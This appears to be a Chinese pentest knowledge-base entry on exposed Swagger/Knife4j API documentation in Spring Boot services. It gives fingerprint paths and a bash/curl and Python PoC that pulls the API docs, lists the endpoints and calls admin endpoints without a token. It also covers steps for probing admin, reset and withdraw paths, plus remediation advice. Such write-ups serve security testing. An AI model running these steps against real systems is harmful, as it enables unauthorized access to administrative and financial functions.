---
title: Swagger / Knife4j 接口文档暴露 → 未授权接口直打
cve: 无（配置缺陷）
severity: high
cvss: 8.3
product: Spring Boot 系（swagger2/3、knife4j、springdoc）
versions: 任意
ports: 80, 443, 8080
keywords: swagger, knife4j, springdoc, 文档, 未授权, api
entry: /v2/api-docs  /doc.html  /swagger-ui/index.html
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET /v2/api-docs            → 200 JSON
GET /v3/api-docs            → 200 JSON
GET /doc.html               → knife4j 页面
GET /swagger-ui/index.html  → swagger 页面
```

## 前置条件

- 生产环境未关闭文档端点。

## PoC

```bash
# 1) 拉全量接口清单
for p in /v2/api-docs /v3/api-docs /v2/api-docs?group=default /doc.html; do
  echo "== $p"; curl -s -o /tmp/d.json -w '%{http_code} %{size_download}\n' "https://target$p"
done

# 2) 解析出 path 与参数
python3 - <<'PY'
import json
d=json.load(open('/tmp/d.json'))
for p,ops in d.get('paths',{}).items():
    for m in ops: print(m.upper(), p)
PY

# 3) 挑“管理类”接口直接打（无 token）
curl -s 'https://target/api/admin/user/list?page=1' | head -c 200
# 判定：200 且有数据 = 未授权
```

## 利用步骤

1. 先拉文档（只读）；
2. 从 path 里筛 `admin|manage|export|reset|withdraw|balance`；
3. 无 token 打一遍，再带普通会员 token 打一遍；
4. 命中即批量接口未授权——写报告时点明可调用的写接口数；
5. 证据：文档 200 + 一条未授权接口回包。

## 修复与缓解

- 生产关闭 swagger/knife4j（`springfox.documentation.enabled=false`）；文档只在内网；
- 网关统一鉴权，不依赖前端隐藏。

## 参考

- OWASP API8 安全配置错误。
